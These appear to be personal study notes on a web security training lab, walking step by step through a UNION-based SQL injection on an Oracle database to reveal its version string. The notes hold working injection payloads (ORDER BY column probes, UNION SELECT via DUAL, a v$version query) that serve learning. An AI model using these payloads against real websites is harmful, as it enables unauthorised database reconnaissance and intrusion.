---
title: 'Lab 7: Querying the Database type and version on O...'
updated: 2022-12-01T11:51:09.0000000+04:00
created: 2022-11-30T13:03:26.0000000+04:00
---

Lab 7: Querying the Database type and version on Oracle
Wednesday, November 30, 2022
1:03 PM

***Different websites have different databases:***

1.  You will need to input queries until you find one that works.

Queries you can use are listed below.

| **Database Type** | **Query**                 |
|-------------------|---------------------------|
| Microsoft, MYSQL  | SELECT @@version          |
| Oracle            | SELECT \* FROM v\$version |
| PostgreSQL        | SELECT version()          |

2.  You can implement the above in a UNION Attack, like below:
- ' UNION SELECT @@version--

**<u>(Lab-07)</u>** - **<u>SQL Injection, querying database type and version on Oracle</u>**

**SQL Injection Vulnerability** - Product Category Filter

**End Goal** - Display the database version string

**<u>Analysis:</u>**

1.  Determine the number of columns

- 'ORDER BY 1-- \|\| Resulted in 200 ok Status
- 'ORDER BY 2-- \| Resulted in 200 ok Status
- 
| 'ORDER BY 3-- | Results in Internal Server Error 500 Status |
|---------------|---------------------------------------------|

2.  Determine the Data Types of the Columns

- Test with a text value like below query:

- 
| ' UNION SELECT 'a', NULL-- | Get internal Server Error (500 Status Code) |
|----------------------------|---------------------------------------------|
| ' UNION SELECT 'a','a'--   | Get Internal Server Error (500 Status Code) |

3.  Since it is an Oracle Database, you need to perform a bit of research on it
- Go to Google and search for: Oracle Select Statement
- You will find that Oracle Select statement requires a FROM clause, when selecting.
- You will need to use a Dummy table, since you don't know any tables yet.
- You can use Oracle integrated Dual table

- 
| SQLi Query to use | ' UNION SELECT 'a','a' FROM DUAL-- |
|-------------------|------------------------------------|

![image1](image1-189.png)

4.  Outputting Database Version

- 
| SQLI Query to use | ' UNION SELECT banner, NULL FROM v\$version-- |
|-------------------|-----------------------------------------------|

![image2](image2-85.png)

